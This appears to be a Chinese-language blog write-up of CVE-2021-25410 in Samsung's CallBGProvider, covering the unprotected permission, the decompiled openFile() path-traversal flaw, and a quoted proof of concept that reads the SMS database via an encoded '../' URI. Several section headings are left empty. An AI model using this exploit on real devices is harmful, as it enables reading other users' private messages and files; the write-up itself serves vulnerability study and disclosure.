---
layout: post
title:  "[CVE-2021-25410] [Samsung] [CallBGProvider] CallBGProvider的调用权限定义为Normal可实现任意私有文件读取"
date:   2022-11-27 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.27 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

三星手机系统的CallBGProvider定义的调用者权限为Normal可以被三方应用调用，其实现的`openFile()`接口存在路径穿越漏洞导致任意文件读取

## 0x01 触发条件

| 上线日期 |     应用名     |                包名                |   版本号   |               MD5                | 下载链接 |
| :------: | :------------: | :--------------------------------: | :--------: | :------------------------------: | :------: |
|          | CallBGProvider | com.samsung.android.callbgprovider | 12.0.00.27 | eee48a238c983450b3832683e35481eb |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.samsung.android.callbgprovider.CallBGProvider`导出 ，有权限`com.samsung.android.callbgprovider.PERMISSION`限制调用者

```xml
<permission android:name="com.samsung.android.callbgprovider.PERMISSION"/>
<provider 
        android:authorities="com.samsung.android.callbgprovider.media" 
        android:exported="true" 
        android:name="com.samsung.android.callbgprovider.CallBGProvider" 
        android:readPermission="com.samsung.android.callbgprovider.PERMISSION">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/filepaths"/>
</provider>
```

`[1]`获取安装目录下的`files`文件夹，`[2]`获取传入URI的PATH字符串，`[3]`取出传入URI最后一段字符串进行拼接，`[4]`构造`[3]`获取的字符串对应的File对象，`[5]`直接打开文件并返回

```java
// com.samsung.android.callbgprovider.CallBGProvider
@Override  // android.content.ContentProvider
public ParcelFileDescriptor openFile(@NonNull Uri __uri__, @NonNull String s) {
    File file1;
    Log.d("CallBGProvider", "openFile: uri:" + __uri__);
    try {
        File dir_files = this.getContext().getFilesDir();  // [1]
        String __uri_path__ = __uri__.getPath();  // [2]
        if(__uri_path__.contains("images/")) {
            file1 = new File(dir_files, "images");
        }
        else if(__uri_path__.contains("videos/")) {
            file1 = new File(dir_files, "videos");
        }
        else {
            file1 = __uri_path__.contains("thumbnail/") ? new File(dir_files, "thumbnail") : null;
        }

        String s2 = file1.getPath() + "/" + __uri__.getLastPathSegment();  // [3]
        File file2 = new File(s2);  // [4]
        Log.d("CallBGProvider", "openFile: uri: path :" + s2);
        return ParcelFileDescriptor.open(file2, 0x10000000);  // [5]
    }
    catch(FileNotFoundException fileNotFoundException) {
        fileNotFoundException.printStackTrace();
        return null;
    }
}
```

漏洞点在于`[3]`调用方法`getLastPathSegment()`的时候，它会进行一次解码操作，所以如果我们传入`content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..`，方法`getLastPathSegment()`会先取出`..%2F..%2F..`并且解码最终得到`../../..`，`[4]`构造File之前并没有进行`../`过滤，所以此处存在任意文件读取漏洞

该ContentProvider的调用权限并没有定义，默认为Normal，所以只需要调用者声明该权限即可直接调用组件`CallBGProvider`

```xml
<permission android:name="com.samsung.android.callbgprovider.PERMISSION"/>
```

## 0x05 调试与利用

Oversecured实验室的PoC

```java
try {
    getContentResolver().call(Uri.parse("content://com.samsung.android.callbgprovider.media"), "get_gradation_contents", "", new Bundle());

    File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
    Uri uri = Uri.parse("content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..%2F..%2F..%2F.." + Uri.encode(dbPath.getAbsolutePath()));
    Log.d("evil", IOUtils.toString(getContentResolver().openInputStream(uri)));
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

Manifest声明权限

```xml
<uses-permission android:name="com.samsung.android.callbgprovider.PERMISSION"/>
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 2》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2

## 附录：调试过程记录

